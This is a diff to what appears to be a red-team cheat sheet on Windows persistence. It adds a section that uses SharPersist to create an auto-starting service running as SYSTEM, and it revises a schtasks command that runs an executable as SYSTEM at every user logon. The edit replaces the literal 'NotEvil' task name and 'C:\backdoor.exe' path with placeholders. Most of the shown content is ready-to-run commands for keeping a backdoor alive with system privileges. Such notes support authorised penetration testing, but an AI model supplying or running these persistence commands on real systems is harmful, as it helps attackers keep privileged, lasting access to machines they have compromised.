@@ -57,10 +57,16 @@ SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powers
 - https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/
 
 ## Elevated
-### Schtasks2
+### Service
+- Create service running as SYSTEM, service is in a stopped state, but with the START_TYPE set to AUTO_START. 
 ```
-# Run task as system each time a user logs in
-schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "NotEvil" /tr C:\backdoor.exe /sc onlogon
+.\SharPersist.exe -t service -c "<PATH TO EXE>" -n "<SERVICE NAME>" -m add
+```
+
+### Schtasks2
+- Run task as system each time a user logs in
+```
+schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASK NAME>" /tr <PATH TO EXE> /sc onlogon
 ```
 
 ### Just Enough Admin
